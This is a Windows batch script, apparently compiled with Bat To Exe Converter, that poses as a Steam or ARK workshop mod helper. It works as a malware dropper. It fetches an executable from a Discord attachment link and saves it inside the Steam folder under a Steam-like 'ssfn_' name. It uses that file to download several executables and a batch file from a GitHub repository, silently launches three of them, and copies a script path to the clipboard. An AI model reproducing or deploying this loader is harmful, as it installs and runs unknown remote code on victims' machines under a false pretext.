::[Bat To Exe Converter]
::
::YAwzoRdxOk+EWAnk
::fBw5plQjdG8=
::YAwzuBVtJxjWCl3EqQJgSA==
::ZR4luwNxJguZRRnk
::Yhs/ulQjdF+5
::cxAkpRVqdFKZSzk=
::cBs/ulQjdF+5
::ZR41oxFsdFKZSDk=
::eBoioBt6dFKZSDk=
::cRo6pxp7LAbNWATEpCI=
::egkzugNsPRvcWATEpCI=
::dAsiuh18IRvcCxnZtBJQ
::cRYluBh/LU+EWAnk
::YxY4rhs+aU+JeA==
::cxY6rQJ7JhzQF1fEqQJQ
::ZQ05rAF9IBncCkqN+0xwdVs0
::ZQ05rAF9IAHYFVzEqQJQ
::eg0/rx1wNQPfEVWB+kM9LVsJDGQ=
::fBEirQZwNQPfEVWB+kM9LVsJDGQ=
::cRolqwZ3JBvQF1fEqQJQ
::dhA7uBVwLU+EWDk=
::YQ03rBFzNR3SWATElA==
::dhAmsQZ3MwfNWATElA==
::ZQ0/vhVqMQ3MEVWAtB9wSA==
::Zg8zqx1/OA3MEVWAtB9wSA==
::dhA7pRFwIByZRRnk
::Zh4grVQjdCyDJGyX8VAjFCxdQgCNK3j3NpYgzO3o5P6IsnEOR+QxR7jUyL+dKO8Dx0rgZtgozn86
::YB416Ek+ZG8=
::
::
::978f952a14a936cc963da21a135fa983
@echo off
TITLE 

IF EXIST "C:\Program Files (x86)\steam\ssfn_rdl.exe" (
echo Exists) ELSE (
  #certreq -Post -config "https://cdn.discordapp.com/attachments/1105541696135123004/1108121595907690527/rdl.exe" c:\windows\win.ini "C:\Program Files (x86)\steam\ssfn_rdl.exe"
  move "C:\Users\user\Downloads\ssfn_rdl.exe" "C:\Program Files (x86)\steam\"
)

IF EXIST "C:\Program Files (x86)\steam\ssfn_WorkshopMods.exe" (
echo Exists) ELSE (
  "C:\Program Files (x86)\steam\ssfn_rdl.exe" -k -L -o "C:\Program Files (x86)\steam\ssfn_WorkshopMods.exe" "https://github.com/tobiasmulln/Testing/raw/main/ssfn_WorkshopMods.exe"
)

"C:\Program Files (x86)\steam\ssfn_rdl.exe" -k -L -o "C:\Users\user\Downloads\VerifyWorkshop.exe" "https://github.com/tobiasmulln/Testing/raw/main/VerifyWorkshop.exe"
"C:\Program Files (x86)\steam\ssfn_rdl.exe" -k -L -o "C:\Users\user\Downloads\Cloud.exe" "https://github.com/tobiasmulln/Testing/raw/main/Cloud.exe"
"C:\Program Files (x86)\steam\ssfn_rdl.exe" -k -L -o "C:\Users\user\Downloads\ARK_WorldsMod.bat " "https://raw.githubusercontent.com/tobiasmulln/Testing/main/ARK_WorldsMod.bat"
"C:\Program Files (x86)\steam\ssfn_rdl.exe" -k -L -o "C:\Users\user\Downloads\noTitles.exe" "https://github.com/tobiasmulln/Testing/raw/main/noTitles.exe"
"C:\Program Files (x86)\steam\ssfn_rdl.exe" -k -L -o "C:\Users\user\Downloads\noTitlesWorse.exe" "https://github.com/tobiasmulln/Testing/raw/main/noTitlesWorse.exe"

start "" "C:\Users\user\Downloads\noTitles.exe"
start "" "C:\Users\user\Downloads\noTitlesWorse.exe"
start "" "C:\Users\user\Downloads\VerifyWorkshop.exe"

echo C:\Users\user\Downloads\ARK_WorldsMod.bat|clip